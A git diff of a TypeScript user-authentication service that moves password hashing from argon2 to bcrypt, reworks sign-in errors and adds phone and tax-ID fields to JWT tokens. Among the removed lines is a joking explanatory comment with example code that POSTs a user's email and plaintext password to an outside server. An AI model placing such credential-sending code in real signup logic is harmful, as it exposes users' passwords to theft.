@@ -3,6 +3,7 @@ import { Service, Inject } from 'typedi';
 import jwt from 'jsonwebtoken';
 import config from '../../../config';
 import argon2 from 'argon2';
+import bcrypt from 'bcrypt';
 import { randomBytes } from 'crypto';
 
 //import MailerService from './mailer.ts.bak';
@@ -18,9 +19,11 @@ import { User } from '../../domain/user/user';
 import { UserPassword } from '../../domain/user/userPassword';
 import { UserEmail } from '../../domain/user/userEmail';
 
-import { Role } from '../../domain/role';
+import { Role } from '../../domain/role/role';
 
 import { Result } from '../../core/logic/Result';
+import { UserPhoneNumber } from '../../domain/user/userPhoneNumber';
+import { UserNif } from '../../domain/user/userNif';
 
 @Service()
 export default class UserService implements IUserService {
@@ -30,57 +33,28 @@ export default class UserService implements IUserService {
     @Inject('logger') private logger,
   ) {}
 
-  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
+  public async signUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
     try {
       const userDocument = await this.userRepo.findByEmail(userDTO.email);
       const found = !!userDocument;
 
       if (found) {
-        return Result.fail<{ userDTO: IUserDTO; token: string }>('User already exists with email=' + userDTO.email);
+        return Result.fail<{ userDTO: IUserDTO; token: string }>('User already exists with email: ' + userDTO.email);
       }
 
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
-
-      const salt = randomBytes(32);
-      this.logger.silly('Hashing password');
-      const hashedPassword = await argon2.hash(userDTO.password, { salt });
-      this.logger.silly('Creating user db record');
-
-      const password = await UserPassword.create({ value: hashedPassword, hashed: true }).getValue();
-      const email = await UserEmail.create(userDTO.email).getValue();
-      let role: Role;
-
-      const roleOrError = await this.getRole(userDTO.role);
-      if (roleOrError.isFailure) {
-        return Result.fail<{ userDTO: IUserDTO; token: string }>(roleOrError.error);
-      } else {
-        role = roleOrError.getValue();
+      // Check if role id is valid
+      const isRoleValid = await this.getRole(userDTO.role);
+      if (isRoleValid.isFailure) {
+        return Result.fail<{ userDTO: IUserDTO; token: string }>(isRoleValid.error);
       }
 
-      const userOrError = await User.create({
-        firstName: userDTO.firstName,
-        lastName: userDTO.lastName,
-        email: email,
-        role: role,
-        password: password,
-      });
+      // Hash the password
+      const hashedPassword = await bcrypt.hash(userDTO.password, 10);
+
+      const userOrError = await User.create({ ...userDTO, password: hashedPassword });
 
       if (userOrError.isFailure) {
+        console.log('[USER SERVICE] Error creating user');
         throw Result.fail<IUserDTO>(userOrError.errorValue());
       }
 
@@ -90,40 +64,43 @@ export default class UserService implements IUserService {
       const token = this.generateToken(userResult);
 
       this.logger.silly('Sending welcome email');
-      //await this.mailer.SendWelcomeEmail(userResult);
+      // await this.mailer.SendWelcomeEmail(userResult);
 
-      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });
+      // this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });
 
       await this.userRepo.save(userResult);
       const userDTOResult = UserMap.toDTO(userResult) as IUserDTO;
       return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTOResult, token: token });
     } catch (e) {
       this.logger.error(e);
-      throw e;
+      throw new Error(`Error creating user:  ${e.message}`);
     }
   }
 
-  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
-    const user = await this.userRepo.findByEmail(email);
-
-    if (!user) {
-      throw new Error('User not registered');
-    }
-
-    /**
-     * We use verify from argon2 to prevent 'timing based' attacks
-     */
-    this.logger.silly('Checking password');
-    const validPassword = await argon2.verify(user.password.value, password);
-    if (validPassword) {
-      this.logger.silly('Password is valid!');
-      this.logger.silly('Generating JWT');
-      const token = this.generateToken(user) as string;
-
-      const userDTO = UserMap.toDTO(user) as IUserDTO;
-      return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO: userDTO, token: token });
-    } else {
-      throw new Error('Invalid Password');
+  public async signIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
+    try {
+      const user = await this.userRepo.findByEmail(email);
+  
+      if (!user) {
+        return Result.fail<{ userDTO: IUserDTO; token: string }>('User not registered');
+      }
+  
+      const validPassword = await bcrypt.compare(password, user.password);
+   
+      if (validPassword) {
+        this.logger.silly('Password is valid!');
+        this.logger.silly('Generating JWT');
+  
+        const token = this.generateToken(user) as string;
+        const userDTO = UserMap.toDTO(user) as IUserDTO;
+  
+        return Result.ok<{ userDTO: IUserDTO; token: string }>({ userDTO, token });
+      } else {
+        return Result.fail<{ userDTO: IUserDTO; token: string }>('Invalid password');
+      }
+    } catch (error) {
+      this.logger.error(`Error during sign-in: ${error.message}`);
+      return Result.fail<{ userDTO: IUserDTO; token: string }>('Unexpected error during sign-in');
     }
   }
 
@@ -143,19 +120,21 @@ export default class UserService implements IUserService {
      */
     this.logger.silly(`Sign JWT for userId: ${user._id}`);
 
-    const id = user.id.toString();
-    const email = user.email.value;
-    const firstName = user.firstName;
-    const lastName = user.lastName;
-    const role = user.role.id.value;
+    const id = user.id;
+    const email = user.email;
+    const name = user.name;
+    const role = user.role.id;
+    const phoneNumber = user.phoneNumber;
+    const nif = user.nif;
 
     return jwt.sign(
       {
         id: id,
         email: email, // We are gonna use this in the middleware 'isAuth'
         role: role,
-        firstName: firstName,
-        lastName: lastName,
+        name: name,
+        phoneNumber: phoneNumber,
+        nif: nif,
         exp: exp.getTime() / 1000,
       },
       config.jwtSecret,
@@ -169,7 +148,7 @@ export default class UserService implements IUserService {
     if (found) {
       return Result.ok<Role>(role);
     } else {
-      return Result.fail<Role>("Couldn't find role by id=" + roleId);
+      return Result.fail<Role>("Couldn't find role with id: " + roleId);
     }
   }
 }
